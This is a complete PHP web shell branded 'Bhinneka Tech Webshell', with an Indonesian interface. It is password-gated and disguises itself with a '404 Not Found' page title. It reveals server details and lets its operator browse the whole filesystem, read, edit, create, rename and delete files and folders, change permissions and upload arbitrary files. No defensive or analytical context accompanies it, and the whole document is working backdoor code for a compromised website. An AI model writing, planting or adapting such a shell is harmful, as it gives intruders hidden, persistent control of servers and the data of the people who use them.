<?php

error_reporting(0);
$password = "6c8bd8c967c9c4a9ad829fddbfc8bf99";
session_start();

if(md5($_POST['password']) == $password) {
	$_SESSION['isLogin'] = true;
}else {
	loginShell();
}

function info() {
  $arr = [
    'ip' => $_SERVER['SERVER_ADDR'],
    'host' => gethostname(),
    'kernel' => php_uname(),
    'disablefunc' => ini_get('disable_functions'),
    'path' => getcwd(),
    'os' => PHP_OS,
  ];  

  return $arr;
} 
$getInfo = info();

if(strtoupper(substr($getInfo['os'], 0, 3)) == 'WIN') {
  $getInfo['os'] = 'Windows';
  $paths = explode('\\', $getInfo['path']);
  $paths = $paths[0] . '/';
}else if(strtoupper(substr($getInfo['os'], 0, 3)) == 'LIN') {
  $getInfo['os'] = 'Linux';
  $paths = '/';
}


$dir = getcwd();

if(isset($_GET['path'])) {
	$replace = str_replace('\\', '/', $_GET['path']);
	$replace = str_replace('//', '/', $_GET['path']);
	$pecah = explode('/', $replace);
}else {
	$replace = str_replace('\\', '/', $dir);
	$pecah = explode('/', $replace);
}

function loginShell() {
		if(!isset($_SESSION['isLogin'])) {
			echo "<form method='POST'><input type='password' name='password'><button type='submit'>Submit</button></form>";
			die();
		}
}

function cekPermission($filenya) {

  $perms = fileperms($filenya);
  switch ($perms & 0xF000) {
    case 0xC000: // socket
        $info = 's';
        break;
    case 0xA000: // symbolic link
        $info = 'l';
        break;
    case 0x8000: // regular
        $info = '-';
        break;
    case 0x6000: // block special
        $info = 'b';
        break;
    case 0x4000: // directory
        $info = 'd';
        break;
    case 0x2000: // character special
        $info = 'c';
        break;
    case 0x1000: // FIFO pipe
        $info = 'p';
        break;
    default: 
        $info = 'u';
}

      //Untuk Owner
      $info .= (($perms & 0x0100) ? 'r' : '-');
      $info .= (($perms & 0x0080) ? 'w' : '-');
      $info .= (($perms & 0x0040) ?
                  (($perms & 0x0800) ? 's' : 'x' ) :
                  (($perms & 0x0800) ? 'S' : '-'));

      //Untuk Group
      $info .= (($perms & 0x0020) ? 'r' : '-');
      $info .= (($perms & 0x0010) ? 'w' : '-');
      $info .= (($perms & 0x0008) ?
                  (($perms & 0x0400) ? 's' : 'x' ) :
                  (($perms & 0x0400) ? 'S' : '-'));

      //Untuk Other
      $info .= (($perms & 0x0004) ? 'r' : '-');
      $info .= (($perms & 0x0002) ? 'w' : '-');
      $info .= (($perms & 0x0001) ?
                  (($perms & 0x0200) ? 't' : 'x' ) :
                  (($perms & 0x0200) ? 'T' : '-'));

      return $info;
}

function hitungSize($fileSize) {
	$bytes = sprintf('%u', filesize($fileSize));

    if ($bytes > 0)
    {
        $unit = intval(log($bytes, 1024));
        $units = array('B', 'KB', 'MB', 'GB');

        if (array_key_exists($unit, $units) === true)
        {
            return sprintf('%d %s', $bytes / pow(1024, $unit), $units[$unit]);
        }
    }

    return $bytes;
}

function bungkus($obj) {
	$wrap = filter_var(htmlspecialchars(file_get_contents($obj)), FILTER_SANITIZE_STRING);
	return $wrap;
}

function deleteFolder($dirnya) {
	$files = array_diff(scandir($dirnya), array('.', '..')); 

    foreach ($files as $file) { 
        (is_dir("$dirnya/$file")) ? deleteFolder("$dirnya/$file") : unlink("$dirnya/$file"); 
    }

    return rmdir($dirnya);
}

function folder_exist($folder)
{
    $path = realpath($folder);

    if($path !== false AND is_dir($path))
    {
        return true;
    }

    return false;
}


if(isset($_GET['path'])) {
	$get = $_GET['path'];
	$pec = explode('/', $get);

	if(is_file($get)) {
		$konten = bungkus($get);
		$cek = true;
		$listDir = scandir($get);
	}else {
		$listDir = array_diff(scandir($get), ['.', '..']);
	}
}else {	
	$get = $replace;
	$listDir = array_diff(scandir($get), ['.', '..']);
}

if(isset($_POST['pilihan'])) {
    switch ($_POST['pilihan']) {
        case 'edit':
            $edit = true;
            $dirFile = $_POST['dir'];
            $sourceFile = $_POST['sourceFile'];
            if(!empty($sourceFile)){
                $fileHandle = fopen($dirFile, 'w');
                if($fileHandle !== false){
                    if(fwrite($fileHandle, $sourceFile) !== false) {
                        fclose($fileHandle);
                        $successEdit = 'Berhasil di edit';
                    } else {
                        fclose($fileHandle);
                        $successEdit = 'Gagal edit';
                    }
                } else {
                    $successEdit = 'Gagal membuka file untuk diedit';
                }
            }
            break;
		case $_POST['pilihan'] == 'rename':
			$rename = true;
			$dirFile = $_POST['dir'];
			$filename = $_POST['namaFile'];
			$namaBaru = $_POST['namaBaru'];
			if(!empty($namaBaru)){
				if(rename($dirFile, $_GET['path'] . '/' . $namaBaru)) {
					$filename = $namaBaru;
					$dirFile = $_GET['path'] . '/' . $namaBaru;
					$successRename = 'Berhasil rename';
				}else {
					$successRename = 'Gagal rename';
				}
 			}
			break;
		case $_POST['pilihan'] == 'delete':
			$dirFile = $_POST['dir'];
			$type = $_POST['type'];
			if(isset($dirFile) && is_file($dirFile)) {
				if(unlink($dirFile)) {	
					$pesanHapus =  "<script>
									alert('File berhasil dihapus!!');
									window.location.href = window.location.href;
								    </script>";
				}else {
					$pesanHapus =  "<script>
									alert('File gagal dihapus!!');
									window.location.href = window.location.href;
								    </script>";
				}
			}else if(isset($dirFile) && is_dir($dirFile)) {
				//$dirFile = $dirFile . '/';
				if(deleteFolder($dirFile)) {
				    $pesanHapus =  "<script>
									alert('Folder berhasil dihapus!!');
									window.location.href = window.location.href;
								    </script>";
				}else {
					$pesanHapus =  "<script>
									alert('Folder gagal dihapus!!');
									window.location.href = window.location.href;
								    </script>";
				}
			}
			break;
		case $_POST['pilihan'] == 'chmod':
			$chmod = true;
			$file = fileperms($_POST['dir']);
			$permission = substr(sprintf('%o', $file), -4);
			$dirFile = $_POST['dir'];
			$perms = octdec($_POST['perms']);
			if(isset($_POST['perms'])) {
				if(isset($perms)) {
					if(chmod($dirFile, $perms)) {
						$permission = decoct($perms);
						$successChmod ='Berhasil chmod!';
					}else {
						$successChmod = 'Gagal chmod!';
					}
				}
			}
			break;
		case $_POST['pilihan'] == 'create':
			$namaFile = "";
			$isiFile = "";

			$dirPath = $_GET['path'] . '/';
			if(isset($_POST['createAction'])) {
				$namaFile = $_POST['createName'];
				$isiFile = ($_POST['createIsi'] == NULL) ? ' ' : $_POST['createIsi'];
				if(!file_exists($dirPath . $namaFile)) {
					if(file_put_contents($dirPath . $namaFile, $isiFile)) {
						$pesanCreate = 'File berhasil dibuat';
					}else {
						$pesanCreate = 'Directory not Writable';
					}
				}else {
					$pesanCreate = 'Nama file / folder sudah ada';
				}
			}
			break;
		case $_POST['pilihan'] == 'createFolder':
			$dirPath = $_GET['path'] . '/';
			if(isset($_POST['createFolder'])) {
				$namaFolder = $_POST['createName'];
				if(mkdir($dirPath . $namaFolder)) {
					$pesanCreate = 'Folder berhasil dibuat';
				}else {
					if(is_dir($namaFolder)) {
						$pesanCreate = 'Nama Folder / File sudah ada';
					}elseif(!is_writable($dirPath)){
						$pesanCreate = 'Directory not writable';
					}
				}
			}
			break;
		case $_POST['pilihan'] == 'upload':
			$path = $replace;
			if(isset($_GET['path'])) {
				$path = $_GET['path'];
			}

			if(isset($_FILES['uploadFile'])) {
				$namafile = $_FILES['uploadFile']['name'];
				$tempatfile = $_FILES['uploadFile']['tmp_name'];
				$error = $_FILES['uploadFile']['error'];
				$ukuranfile = $_FILES['uploadFile']['size'];

				if(move_uploaded_file($tempatfile, $path.'/'.$namafile)) {
					echo "<script>
						  alert('File berhasil diupload!!');
						  window.location.href = window.location.href;
						  </script>";
				}else {
					echo "<script>
						  alert('File gagal diupload!!');
						  window.location.href = window.location.href;
						  </script>";
				}
			}
			break;
	}
}



?>
<!DOCTYPE html>
<html>
<head>
	<title>404 Not Found</title>
</head>
<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css">
<meta name="viewport" content="width=1024">
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<meta name="viewport" content="width=device-width, initial-scale=0.60, shrink-to-fit=no">
<style type="text/css">
	body {
		width: 100vw;
  		height: 100px;
		overflow-x: hidden !important;
	}
	.info {
		display: block;
		width: 100%;
	}
		
	table.striped > tbody > tr:nth-child(odd) {
		background-color: rgba(170, 213, 213, 0.5);
	}
	nav {
		background-color: #42a5f5;
	}
	.select-wrapper {
		position: relative;
		width: 100px;
		display: inline-block;
	}

	.file-field .btn, .file-field .btn-large, .file-field .btn-small {
		float: inherit;
		height: 3rem;
		line-height: 3rem;
	}

	.select-wrapper .caret {
		right: auto !important;
	}

	.select-wrapper input.select-dropdown {
		width: 50%;
	}

	textarea {
    	height: 50rem !important;
		overflow-y: scroll !important;
		height: 700px !important;
	}

	.maung {
		height: 700px !important;
	}

	table{
		width:100%;
		table-layout: fixed;
		overflow-wrap: break-word;
	}
	
	@media screen and (max-width: 732px) {
		.navbar-text {
			font-size: 25px !important;
			width: 280px !important;
		}
	}

</style>
<body>
	<div class="content">
	<nav>
       <div class="container">
	    <div class="nav-wrapper">
	      <a href="#" class="brand-logo center navbar-text">Bhinneka Tech Webshell</a>
	    </div>
	   </div>
  	</nav>

  	<div class="container" style="margin-top: 30px;">
        <b class="info">Server IP : <?= $getInfo['ip']; ?></b>
        <b class="info">Hostname : <?= $getInfo['host']; ?></b>
        <b class="info">Kernel : <?= $getInfo['kernel']; ?></b>
        <b class="info">OS : <?= $getInfo['os']; ?></b>
		<b class="info">USER : <?= get_current_user(); ?></b>
	</div>
	<br>	
	<?php if($cek){ ?>

<div class="container">
<div class="row">
	<div style="font-size: 17px;">
	<?php   
				echo '<a href="?path=' . $paths . '">' . '-' . '</a>';
				for ($i = 1; $i < count($pecah); $i++) {
					$subpath = implode('/', array_slice($pecah, 1, $i));
					echo '/';
					echo '<a href="?path=/' . urlencode($subpath) . '">' . $pecah[$i] . '</a>';
				}
				?>
	</div>
    <form class="col s12">
      <div class="row">
        <div class="input-field col s12">
          <textarea id="textarea" class="materialize-textarea" style="background-color: ghostwhite; overflow-y: auto;" disabled><?= $konten; ?></textarea>
        </div>
      </div>
    </form>
  </div>
 </div>
	<?php }else if($edit){ ?>
		<div class="container">
		<?php   
				echo '<a href="?path=' . $paths . '">' . '-' . '</a>';
				for ($i = 1; $i < count($pecah); $i++) {
					$subpath = implode('/', array_slice($pecah, 1, $i));
					echo '/';
					echo '<a href="?path=/' . urlencode($subpath) . '">' . $pecah[$i] . '</a>';
				}
		?>
		<?= !empty($successEdit) ? "<p class='blue-text text-darken-2'>" . $successEdit . "</p>" : ""; ?>
		<form method="POST">
		<input type="hidden" name="dir" value="<?= $dirFile; ?>">
		<input type="hidden" name="pilihan" value="edit">
		<div class="row">
			<form class="col s12">
				<div class="input-field col s12">
				<textarea name="sourceFile" id="textarea" class="materialize-textarea" style="background-color: ghostwhite; overflow-y: auto;" ><?= bungkus($dirFile); ?></textarea>
				<label for="textarea" class='active'>Edit File</label>
				<button class="btn waves-effect waves-light" type="submit" name="action">Edit</button>
			</form>
		</div>
		</form>
		</div>
	<?php }else if($rename){ ?>
		<div class="container">
		<?php   
				echo '<a href="?path=' . $paths . '">' . '-' . '</a>';
				for ($i = 1; $i < count($pecah); $i++) {
					$subpath = implode('/', array_slice($pecah, 1, $i));
					echo '/';
					echo '<a href="?path=/' . urlencode($subpath) . '">' . $pecah[$i] . '</a>';
				}
				?>
		<?= !empty($successRename) ? "<p class='blue-text text-darken-2'>" . $successRename . "</p>" : ""; ?>
		<form method="POST">
			<input type="hidden" name="dir" value="<?= $dirFile; ?>">
			<input type="hidden" name="pilihan" value="rename">
			  <div class="row center-align">
			    <div class="input-field col s12">
			      <input value="<?= $filename; ?>" name="namaBaru" id="rename" type="text" class="validate">
			      <label class="active" for="rename">Input disini:</label>
			      <button class="btn waves-effect waves-light" type="submit" name="action">Rename</button>
			    </div>
			  </div>			  
		</form>
		</div>
	<?php }else if($chmod) { ?>
		<div class="container">
		<?php   
				echo '<a href="?path=' . $paths . '">' . '-' . '</a>';
				for ($i = 1; $i < count($pecah); $i++) {
					$subpath = implode('/', array_slice($pecah, 1, $i));
					echo '/';
					echo '<a href="?path=/' . urlencode($subpath) . '">' . $pecah[$i] . '</a>';
				}
				?>
		<?= !empty($successChmod) ? "<p class='blue-text text-darken-2'>" . $successChmod . "</p>" : ''; ?>
		<form method="POST">
			<input type="hidden" name="dir" value="<?= $dirFile; ?>">
			<input type="hidden" name="pilihan" value="chmod">
			  <div class="row center-align">
			    <div class="input-field col s12">
			      <input value="<?= $permission; ?>" name="perms" id="chmod" type="text" class="validate">
			      <label class="active" for="chmod">Input disini:</label>
			      <button class="btn waves-effect waves-light" type="submit" name="action">Chmod</button>
			    </div>
			  </div>
		</form>
		</div>
	<?php }else if(isset($_GET['create'])){ ?>
		<br>
		<div class="container">
		<?php   
				echo '<a href="?path=' . $paths . '">' . '-' . '</a>';
				for ($i = 1; $i < count($pecah); $i++) {
					$subpath = implode('/', array_slice($pecah, 1, $i));
					echo '/';
					echo '<a href="?path=/' . urlencode($subpath) . '">' . $pecah[$i] . '</a>';
				}
				?>
		<?= !empty($pesanCreate) ? "<p class='blue-text text-darken-2'>" . $pesanCreate . "</p>" : ""; ?>
		<form method="POST">
			<input type="hidden" name="pilihan" value="create">
			  <div class="row center-align">
			    <div class="input-field col s12">
			      <input name="createName" id="createFile" type="text" class="validate" value="<?= $namaFile; ?>">
			      <label class="active" for="createFile">Nama File</label>
			      <textarea name="createIsi" class="materialize-textarea" style="height: 400px; background-color: ghostwhite; overflow-y: scroll;"><?= $isiFile; ?></textarea>
			      <button class="btn waves-effect waves-light" type="submit" name="createAction">Create</button>
			    </div>
			  </div>
		</form>
		</div>
	<?php }else if(isset($_GET['createFolder'])){ ?>
		<div class="container">
		<?php   
				echo '<a href="?path=' . $paths . '">' . '-' . '</a>';
				for ($i = 1; $i < count($pecah); $i++) {
					$subpath = implode('/', array_slice($pecah, 1, $i));
					echo '/';
					echo '<a href="?path=/' . urlencode($subpath) . '">' . $pecah[$i] . '</a>';
				}
				?>
		<?= !empty($pesanCreate) ? "<p class='blue-text text-darken-2'>" . $pesanCreate . "</p>" : ""; ?>
		<form method="POST">
			<input type="hidden" name="pilihan" value="createFolder">
			  <div class="row center-align">
			    <div class="input-field col s12">
			      <input name="createName" id="createFolder" type="text" class="validate" value="<?= $namaFolder; ?>">
			      <label class="active" for="createFolder">Nama Folder</label>
			      <button class="btn waves-effect waves-light" type="submit" name="createFolder">Create</button>
			    </div>
			  </div>
		</form>
		</div>
	<?php }else{ ?>
   <div class="container">	
   <b class="info">
	 <a href="?create&path=<?= isset($_GET['path']) ? $_GET['path'] : $replace; ?>" class="btn-floating btn-large waves-effect waves-light red"><i class="material-icons">add</i></a> <b>Add File&nbsp;&nbsp;&nbsp;</b>
	 <a href="?createFolder&path=<?= isset($_GET['path']) ? $_GET['path'] : $replace; ?>" class="btn-floating btn-large waves-effect waves-light blue""><i class="material-icons">add</i></a> <b>Add Folder</b>
	<br>
	<b class="info">
		 <form method="POST" enctype="multipart/form-data">
		    <div class="file-field input-field">
		      <div class="btn">
		        <span>File</span>
		        <input type="hidden" name="pilihan" value="upload">
		        <input type="hidden" name="dir" value="<?= $_GET['path'] ?>">
		        <input type="file" name="uploadFile">
		      </div>
		      <div class="file-path-wrapper">
		        <input class="file-path validate" type="text" style="width: 300px">
		        <button class="btn waves-effect waves-light" type="submit" name="actionUpload">Upload!
				</button>
		      </div>
		    </div>
  		</form>
	</b>
	<!-- <div style="font-size: 18px;"> -->
	<div class="row"><div class="col s12" style="font-size: 18px;">
	PATH:
	<?php   
				echo '<a href="?path=' . $paths . '">' . '-' . '</a>';
				for ($i = 1; $i < count($pecah); $i++) {
					$subpath = implode('/', array_slice($pecah, 1, $i));
					echo '/';
					echo '<a href="?path=/' . urlencode($subpath) . '">' . $pecah[$i] . '</a>';
				}
				?>
	</div></div>
</div>

   <div class="container">	
	<table class="striped centered bordered">
		<?= !empty($pesanHapus) ? $pesanHapus : ''; ?>			
		<thead>	
		<tr>
			<th>Nama</th>
			<th>Size</th>
			<th>Permission</th>
			<th>Action</th>
		</tr>
		</thead>
		<?php foreach($listDir as $dir): ?>
		<tr>
			<td><a style="color: black;" href="?path=<?= str_replace([".", "//"], ["%2e", '/'], $get . '/' . $dir); ?>"><?= $dir; ?></a></td>
			<td><?= is_file($get . '/' . $dir) ? hitungSize($get . '/' . $dir) : 'Folders'; ?></td>
			<td><?= is_writable($get . '/' . $dir) ? '<font color="green">' . @cekPermission($get . '/' . $dir) . '</font>' : '<font color="red">' . @cekPermission($get . '/' . $dir) . '</font>';?></td>
			<td>
				<?php if(is_file($get . '/' . $dir)): ?>
				<form method="POST" action="?set&path=<?= $get; ?>">
					<center>
					<select class="browser-default" name="pilihan" style="height: 30px; width: 70px; z-index: 1;">
						<option value="Select" disabled selected>Pilih</option>
						<option value="rename">Rename</option>
						<option value="edit">Edit</option>
						<option value="delete">Delete</option>
						<option value="chmod">Chmod</option>
					</select>
					</center>
					<input type="hidden" name="type" value="file">
					<input type="hidden" name="namaFile" value="<?= $dir; ?>">
					<input type="hidden" name="dir" value="<?= $get . '/' . $dir ?>">
					 <button class="btn waves-effect waves-light" type="submit" name="action">
					    <i class="material-icons right">send</i>
					 </button>
				</form>
				<?php else: ?>
				<form method="POST" action="?set&path=<?= $get; ?>">	
					<center>
					<select class="browser-default" name="pilihan" style="height: 30px; width: 70px; z-index: 1;" name="pilihan">
						<option value="Select" disabled selected>Pilih</option>
						<option value="rename">Rename</option>
						<option value="delete">Delete</option>
						<option value="chmod">Chmod</option>
					</select>
					</center>
					<input type="hidden" name="type" value="folder">
					<input type="hidden" name="namaFile" value="<?= $dir; ?>">
					<input type="hidden" name="dir" value="<?= $get . '/' . $dir ?>">
					<button class="btn waves-effect waves-light" type="submit" name="action">
					    <i class="material-icons right">send</i>
					</button>
				</form>
				<?php endif; ?>
			</td>
		</tr>
		<?php endforeach; ?>
	</table>
</div>
	<?php } ?>
</div>

	<footer id="footer" style="margin-top: 100px;">

	</footer>

<script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
<script> 

var footer = document.querySelector("footer");

function stopScrollAtFooter() {
    var footerHeight = footer.clientHeight;
    var contentHeight = document.body.scrollHeight;
    var scrollY = window.scrollY;

	if (scrollY + window.innerHeight >= contentHeight - footerHeight) {
			window.scrollTo(0, contentHeight - window.innerHeight);
		}
	}

	window.addEventListener("scroll", stopScrollAtFooter);


	document.addEventListener('DOMContentLoaded', function() {
    var elems = document.querySelectorAll('select');
    var instances = M.FormSelect.init(elems, {});
  });
</script>
</body>
</html>
